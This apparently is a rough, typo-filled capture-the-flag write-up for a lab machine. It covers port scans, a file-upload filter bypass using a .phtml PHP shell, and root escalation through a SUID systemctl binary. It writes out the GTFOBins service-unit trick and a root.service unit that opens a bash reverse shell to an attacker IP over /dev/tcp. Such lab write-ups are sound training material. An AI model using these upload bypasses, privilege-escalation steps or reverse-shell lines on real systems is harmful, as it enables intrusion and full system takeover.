@@ -1,0 +1,100 @@
+started with rustscan instead of nmap if you are beginner you can just read through the manual
+
+PORT     STATE SERVICE      REASON
+21/tcp   open  ftp          syn-ack
+22/tcp   open  ssh          syn-ack
+139/tcp  open  netbios-ssn  syn-ack
+445/tcp  open  microsoft-ds syn-ack
+3128/tcp open  squid-http   syn-ack
+3333/tcp open  dec-notes    syn-ack
+
+
+
+rustscan -a 10.10.13.124
+
+nmap scan on port 3128
+
+PORT     STATE SERVICE    VERSION
+3128/tcp open  http-proxy Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+
+
+
+
+as following the walkthough i started the go buster scan on port 3333 and got a directory nnamed internal on the webser whic was having a upload form
+
+as followinf walkthrough i read about burp suite and  did the intruder  attack with sniper and the list was html,php,php5,php3,phtml
+
+i found thaat phtml was not being filtered
+
+
+
+after that i upload the php shell with phtml extention ans opened it using the iploads doir i found in dir scan inside /internal directory /internal/uploads
+
+
+started a rev shell listener in my terminal got the shell upgraded it using commands 
+
+searched for suid binaries 
+
+saw /bin/systemctl was having suid bit set searched in gtfo bin for that 
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+
+
+did this and in this
+
+ExecStart=/bin/sh -c "id > /tmp/output" 
+
+i used this
+
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+
+got the root flag we can also get a rev shell from root using using suid systemctl by doing this
+
+--> 
+
+just create a file named root.service or anything else
+
+[Unit]
+Description=roooooooooooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.12.104/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+
+enter this corectly in thaat file
+
+and wget this file in the victim machine after that you have to start this file by 
+
+Before we can execute our root.service file, we need to place it onto the target file system if it’s not there already. Once that is done, we just need to use systemctl to start our custom service. To do this, we first need to set up our listener. Once we do that, we need to make sure we specify our root.service file location in our systemctl command arguments.
+
+/bin/systemctl enable /tmp/root.service
+
+/bin/systemctl start root
+
+you will get the rev shell connection on the shell
+
+cheers now you are the root user
+
+
+
+===========================
+for more information regarding the root priv esc part i used this blog
+
+
+https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
+
+======================
